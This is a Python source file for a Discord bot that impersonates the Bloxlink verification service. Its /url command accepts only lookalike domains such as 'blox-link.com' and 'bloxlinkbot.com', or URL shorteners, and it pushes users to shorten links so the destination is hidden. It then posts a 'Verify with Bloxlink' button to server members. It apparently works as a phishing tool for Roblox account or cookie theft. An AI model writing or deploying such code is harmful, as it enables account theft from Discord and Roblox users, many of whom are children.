import os
import discord
from discord import app_commands
from discord import Embed

intents = discord.Intents.default()
intents.guilds = True

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')
    print(f'Bot is in {len(client.guilds)} guild(s)')
    
    await client.change_presence(activity=discord.Activity(
        type=discord.ActivityType.playing,
        name="/invite | blox.link"
    ))
    
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} command(s) globally")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@client.event
async def on_guild_join(guild):
    me = guild.me
    
    channel = guild.system_channel
    if channel is None:
        for text_channel in guild.text_channels:
            perms = text_channel.permissions_for(me)
            if perms.send_messages and perms.view_channel:
                channel = text_channel
                break

    if channel:
        embed = Embed(
            title="# FAKE BLOXLINK BOT JOINED!",
            description=(
                "Hello! Thanks for using this service.\n\n"
                "If you want to donate via Robux make sure to dm @Mar\n\n"
                "**NOTE:** This bot is made for **Flapes server**. If this bot is from a different server, "
                "**REPORT THIS TO ME OR THE OWNER OF YOUR SERVER.**\n\n"
                "**🛑 DELETE THIS MESSAGE TO CONTINUE USING THE BOT 🛑**"
            ),
            color=0xFFA500
        )
        
        await channel.send(content="||@everyone||", embed=embed)
        await channel.send("https://discord.gg/qnDrD3rU2M")

@tree.command(
    name="url",
    description="Get a verification link with Bloxlink"
)
@app_commands.describe(
    link="Enter a valid Bloxlink URL (https://blox-link.com or https://bloxlinkbot.com)"
)
async def url_command(interaction: discord.Interaction, link: str):
    valid_bloxlink_domains = [
        "https://blox-link.com",
        "https://bloxlinkbot.com"
    ]
    
    accepted_shortened_domains = [
        "https://is.gd/",
        "https://url-shortener.robl0x.workers.dev/"
    ]
    
    bare_domains = [
        "https://blox-link.com",
        "https://blox-link.com/",
        "https://bloxlinkbot.com",
        "https://bloxlinkbot.com/"
    ]
    
    is_accepted_shortened = any(link.startswith(domain) for domain in accepted_shortened_domains)
    is_bloxlink = any(link.startswith(domain) for domain in valid_bloxlink_domains)
    
    if is_accepted_shortened:
        verified_link = link
    elif is_bloxlink:
        if link in bare_domains:
            await interaction.response.send_message(
                "shorten the link first man\nshorten it here: https://flapes.vercel.app/hyperlink",
                ephemeral=True
            )
            return
        else:
            verified_link = link
    else:
        await interaction.response.send_message(
            "hey dude wrong link lol\nSupported: https://bloxlinkbot.com/ https://blox-link.com/",
            ephemeral=True
        )
        return
    
    server_name = f"**{interaction.guild.name}**"
    success_message = (
        f"Welcome to {server_name}! Click the button below to Verify with Bloxlink and gain access to the rest of the server."
    )
    
    view = discord.ui.View()
    view.add_item(
        discord.ui.Button(
            label="Verify with Bloxlink",
            style=discord.ButtonStyle.success,
            url=verified_link
        )
    )
    view.add_item(
        discord.ui.Button(
            label="Need help?",
            style=discord.ButtonStyle.secondary,
            url="https://www.youtube.com/playlist?list=PLz7SOP-guESE1V6ywCCLc1IQWiLURSvBE"
        )
    )
    
    await interaction.response.defer(ephemeral=True)
    
    target_channel = None
    if (interaction.channel.permissions_for(interaction.guild.me).send_messages and
            interaction.channel.permissions_for(interaction.guild.me).view_channel):
        target_channel = interaction.channel
    else:
        for ch in interaction.guild.text_channels:
            perms = ch.permissions_for(interaction.guild.me)
            if perms.send_messages and perms.view_channel:
                target_channel = ch
                break
    
    if target_channel:
        await target_channel.send(success_message, view=view)
    
    await interaction.followup.send("✅ Verification message sent!", ephemeral=True)

if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    
    if not token:
        try:
            from dotenv import load_dotenv
            load_dotenv()
            token = os.getenv("DISCORD_TOKEN")
        except ImportError:
            pass
    
    if not token:
        print("Error: No Discord token found.")
        print("Please set the DISCORD_TOKEN environment variable or create a .env file.")
        exit(1)
    
    client.run(token)
